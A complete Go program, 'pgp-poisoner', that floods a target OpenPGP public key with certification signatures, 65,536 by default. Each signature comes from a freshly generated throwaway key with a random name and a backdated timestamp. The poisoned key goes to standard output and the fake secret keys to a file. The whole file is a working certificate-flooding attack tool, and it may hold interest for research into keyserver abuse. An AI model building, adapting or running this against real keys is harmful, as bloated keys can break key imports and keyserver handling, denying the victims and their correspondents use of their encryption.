package main

import (
	"bufio"
	"fmt"
	"io"
	"io/ioutil"
	"os"
	"strconv"
	"time"

	"nullprogram.com/x/optparse"
	"nullprogram.com/x/passphrase2pgp/openpgp"
	"lukechampine.com/frand"
)

const (
	// Earliest creation date for fake signing keys
	earliest = 946702800 // 2000-01-01

	// Default number of signatures to attach
	numSigs  = 1 << 16

	// Default output location for secret keys
	keyOut   = "keys.pgp"
)

type config struct {
	numSigs int64
	keyOut  string
}

func usage(w io.Writer) {
	bw := bufio.NewWriter(w)
	n := strconv.Itoa(numSigs)
	f := func(s ...interface{}) {
		fmt.Fprintln(bw, s...)
	}
	f("usage: pgp-poisoner [-k FILE] [-n INT] <target.pgp >poisoned.pgp")
	f("  -h         print this help message")
	f("  -k FILE    signing secret keys output file [" + keyOut + "]")
	f("  -n INT     number of signatures to append [" + n + "]")
	bw.Flush()
}

func parse() *config {
	config := config{
		numSigs: numSigs,
		keyOut:  keyOut,
	}

	options := []optparse.Option{
		{"help", 'h', optparse.KindNone},
		{"keys", 'k', optparse.KindRequired},
		{"count", 'n', optparse.KindRequired},
	}

	results, rest, err := optparse.Parse(options, os.Args)
	if err != nil {
		fmt.Fprintln(os.Stderr, "pgp-poisoner:", err)
		usage(os.Stderr)
		os.Exit(1)
	}

	for _, r := range results {
		switch r.Long {
		case "help":
			usage(os.Stdout)
			os.Exit(0)
		case "keys":
			config.keyOut = r.Optarg
		case "count":
			n, err := strconv.ParseInt(r.Optarg, 10, 64)
			if err != nil || n < 1 {
				fmt.Fprintln(os.Stderr, "pgp-poisoner: invalid count")
				os.Exit(1)
			}
			config.numSigs = n
		}
	}

	if len(rest) != 0 {
		fmt.Fprintln(os.Stderr, "pgp-poisoner: too many arguments")
		usage(os.Stderr)
		os.Exit(1)
	}

	return &config
}

func poison(buf []byte, w io.Writer, c *config) error {
	latest := time.Now().Unix()

	pubkey, buf, err := openpgp.ParsePacket(buf)
	if err != nil {
		return err
	}
	if _, err := w.Write(pubkey.Encode()); err != nil {
		return err
	}

	uid, buf, err := openpgp.ParsePacket(buf)
	if err != nil {
		return err
	}
	if _, err := w.Write(uid.Encode()); err != nil {
		return err
	}

	sig, buf, err := openpgp.ParsePacket(buf)
	if err != nil {
		return err
	}
	if _, err := w.Write(sig.Encode()); err != nil {
		return err
	}

	keys, err := os.Create(c.keyOut)
	if err != nil {
		return err
	}
	defer keys.Close()
	save := bufio.NewWriter(keys)
	defer save.Flush()

	pubkeypkt := pubkey.Encode()
	uidpkt := uid.Encode()

	var key openpgp.SignKey
	var seed [32]byte
	gen := frand.New()
	for i := int64(0); i < c.numSigs; i++ {
		// Generate a fresh signing key
		gen.Read(seed[:])
		created := int64(gen.Intn(int(latest-earliest))) + earliest
		key.SetCreated(created)
		key.Seed(seed[:])
		name := fmt.Sprintf("%016x", gen.Uint64n(0xffffffffffffffff))
		keyuid := &openpgp.UserID{[]byte(name)}
		save.Write(key.Packet())
		save.Write(keyuid.Packet())
		save.Write(key.SelfSign(keyuid, created, 0))

		// Attach a certification signature to target
		when := int64(gen.Intn(int(latest-created))) + created
		cert := key.Certify(pubkeypkt, uidpkt, when)
		if _, err := w.Write(cert); err != nil {
			return err
		}
	}

	if err := save.Flush(); err != nil {
		return err
	}

	return nil
}

func main() {
	config := parse()

	target, err := ioutil.ReadAll(os.Stdin)
	if err != nil {
		fmt.Fprintln(os.Stderr, "pgp-poisoner:", err)
		os.Exit(1)
	}

	w := bufio.NewWriter(os.Stdout)
	if err := poison(target, w, config); err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}
	if err := w.Flush(); err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}
}
